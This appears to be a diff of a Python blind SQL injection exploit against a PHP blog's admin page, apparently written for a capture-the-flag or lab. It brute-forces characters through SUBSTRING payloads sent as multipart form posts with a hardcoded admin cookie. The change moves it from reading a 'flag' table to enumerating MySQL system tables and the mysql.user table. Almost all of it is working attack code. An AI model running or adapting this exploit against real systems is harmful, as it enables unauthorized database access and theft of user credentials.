@@ -12,22 +12,26 @@ def sqli():
     proxies= {"http":"http://127.0.0.1:8080",
             "https":"http://127.0.0.1:8080"}
     headers={"Content-Type": "multipart/form-data;boundary=---------------------------29609271438811050402597506081"}
-    cookies= {"TEST_ADMIN":"538f00ec5f4e2992033eafced683a063"}
+    cookies= {"TEST_ADMIN":"1ee91a37a2b8be36663442be518ca1ac"}
     secret=""
     count=0
     charlist= string.digits + string.ascii_letters + string.punctuation
     
-    for num in range(1,40):
-        if count > 90:
-            break
-        else:
-            pass
-        for char in charlist:
-            #payload=f"'or (SELECT IF(SUBSTRING(table_name,1,1)='{char}','foo',(SELECT 8013 UNION SELECT 4679))FROM information_schema.tables WHERE table_schema = 'flag' LIMIT 1)-- -"
-            #payload=f"'or (SELECT IF(SUBSTRING(column_name,1,1)='{char}','foo',(SELECT 8013 UNION SELECT 4679))FROM information_schema.columns WHERE table_name='flag' AND table_schema = 'flag' LIMIT 1)-- -"
-            payload=f"'or (SELECT IF(SUBSTRING(flag,{num},1)='{char}','foo',(SELECT 8013 UNION SELECT 4679))FROM flag.flag LIMIT 1)-- -"
-            
-            data= f'''-----------------------------29609271438811050402597506081
+    for offset_num in range(0,30):
+        count=0
+        secret= f"{secret}\n"
+        for num in range(1,40):
+            if count > 90:
+                print("Next Offset\n")
+                break
+            else:
+                pass
+            for char in charlist:
+                payload=f"'or (SELECT IF(SUBSTRING(table_name,{num},1)='{char}','foo',(SELECT 8013 UNION SELECT 4679))FROM information_schema.tables WHERE table_schema = 'mysql' limit 1 offset {offset_num})-- -"
+                #payload=f"'or (SELECT IF(SUBSTRING(column_name,{num},1)='{char}','foo',(SELECT 8013 UNION SELECT 4679))FROM information_schema.columns WHERE table_name='user' AND table_schema = 'mysql' LIMIT 1 offset {offset_num})-- -"
+                #payload=f"'or (SELECT IF(SUBSTRING(user,{num},1)='{char}','foo',(SELECT 8013 UNION SELECT 4679))FROM mysql.user LIMIT 1 offset {offset_num})-- -"
+                
+                data= f'''-----------------------------29609271438811050402597506081
 Content-Disposition: form-data; name="current_view"
 
 DV
@@ -178,18 +182,18 @@ Content-Disposition: form-data; name="SearchString"
 
 -----------------------------29609271438811050402597506081--'''
 
-            response= requests.post(url=f"http://{target}/blog/blogadmin/blogs_view.php", allow_redirects=True, verify=False, proxies=proxies, cookies=cookies, headers=headers, data=data)
+                response= requests.post(url=f"http://{target}/blog/blogadmin/blogs_view.php", allow_redirects=True, verify=False, proxies=proxies, cookies=cookies, headers=headers, data=data)
 
-            response= requests.get(url=f"http://{target}/blog/single.php?id=1", proxies=proxies, cookies=cookies, allow_redirects=True)
+                response= requests.get(url=f"http://{target}/blog/single.php?id=1", proxies=proxies, cookies=cookies, allow_redirects=True)
 
-            if len(response.text) > 1000 and "error in your SQL" not in response.text and "Subquery returns more than 1 row" not in response.text:
-                secret += char
-                print(secret)
-                count= 0
-                break
-            else:
-                count +=1
-                pass
+                if len(response.text) > 1000 and "error in your SQL" not in response.text and "Subquery returns more than 1 row" not in response.text:
+                    secret += char
+                    print(secret)
+                    count= 0
+                    break
+                else:
+                    count +=1
+                    pass
     
 try:
     sqli()
